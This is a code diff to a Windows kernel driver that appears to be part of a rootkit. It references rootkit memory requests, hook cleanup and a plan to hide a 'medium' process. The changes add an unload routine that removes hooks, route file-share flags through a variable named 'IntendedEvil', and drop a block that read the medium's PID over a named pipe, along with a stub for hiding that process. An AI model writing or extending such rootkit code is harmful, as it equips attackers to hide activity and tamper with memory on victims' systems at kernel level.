@@ -4,19 +4,27 @@
 #pragma warning(disable : 4302)
 
 
-// Piping implementation-dependent functions:
+BOOL DestroyDriver = FALSE;
+void ShrootUnload(PDRIVER_OBJECT DriverObject) {
+	UNREFERENCED_PARAMETER(DriverObject);
+	DestroyDriver = TRUE;
+	roothook::CleanAllHooks();
+}
+
+
 NTSTATUS ShowDominanceADD(PCWSTR DomFileName) {
 	HANDLE DomHandle = NULL;
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	UNICODE_STRING FileName = { 0 };
 	OBJECT_ATTRIBUTES FileAttr = { 0 };
 	IO_STATUS_BLOCK FileStatusBlock = { 0 };
+	ULONG IntendedEvil = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;  // 0x56800865;
 	LARGE_INTEGER DelayTime = { 0 };
 	DelayTime.QuadPart = 2000000000;  // 2 seconds
 
 	RtlInitUnicodeString(&FileName, DomFileName);
 	InitializeObjectAttributes(&FileAttr, &FileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
-	Status = ZwCreateFile(&DomHandle, SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE, &FileAttr, &FileStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+	Status = ZwCreateFile(&DomHandle, SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE, &FileAttr, &FileStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, IntendedEvil, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 	if (!NT_SUCCESS(Status) || DomHandle == NULL) {
 		DbgPrintEx(0, 0, "KMDFdriver Piping - ShowDominanceADD() failed: 0x%x\n", Status);
 		if (DomHandle != NULL) {
@@ -39,9 +47,10 @@ BOOL ShouldRenewDriverADD(PCWSTR DomFileName, BOOL Silent) {
 	UNICODE_STRING FileName = { 0 };
 	OBJECT_ATTRIBUTES FileAttr = { 0 };
 	IO_STATUS_BLOCK FileStatusBlock = { 0 };
+	ULONG IntendedEvil = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;  // 0x56800865;
 	RtlInitUnicodeString(&FileName, DomFileName);
 	InitializeObjectAttributes(&FileAttr, &FileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
-	Status = ZwCreateFile(&DomHandle, SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE, &FileAttr, &FileStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+	Status = ZwCreateFile(&DomHandle, SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE, &FileAttr, &FileStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, IntendedEvil, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 	if (!NT_SUCCESS(Status) || DomHandle == NULL) {
 		if (!Silent) {
 			DbgPrintEx(0, 0, "KMDFdriver Piping - ShouldRenewDriverADD() returned an error, no need to renew (status = 0x%x)\n", Status);
@@ -122,7 +131,6 @@ NTSTATUS ReadPipe(HANDLE* PipeHandle, PIO_STATUS_BLOCK PipeStatusBlock, PVOID Ou
 
 
 void PipeClient() {
-	BOOL DestroyDriver = FALSE;
 	HANDLE PipeHandle = NULL;
 	PVOID CurrentRequest = NULL;
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
@@ -153,24 +161,6 @@ void PipeClient() {
 			KeDelayExecutionThread(KernelMode, FALSE, &DelayTime);
 			Status = OpenPipe(&PipeHandle, &PipeAttr, &PipeStatusBlock, TRUE);  // Until pipe is created
 		}
-
-
-		// Get initial message with PID of medium:
-		CurrentRequest = ExAllocatePoolWithTag(NonPagedPool, sizeof(ROOTKIT_MEMORY), 'PpRb');
-		while (CurrentRequest == NULL) {
-			CurrentRequest = ExAllocatePoolWithTag(NonPagedPool, sizeof(ROOTKIT_MEMORY), 'PpRb');
-		}
-		Status = ReadPipe(&PipeHandle, &PipeStatusBlock, CurrentRequest, sizeof(ROOTKIT_MEMORY));
-		while (!NT_SUCCESS(Status) && Status != STATUS_PIPE_BROKEN) {
-			Status = ReadPipe(&PipeHandle, &PipeStatusBlock, CurrentRequest, sizeof(ROOTKIT_MEMORY));
-		}
-		if (Status == STATUS_PIPE_BROKEN) {
-			continue;
-		}
-
-
-		// Hide process of medium with the PID:
-		// TODODODODODODODODODODODODODODODO              -=-=-=-=+~_+_~+_~+_~~
 
 
 		// Get requests again and again until pipe object is not valid anymore:
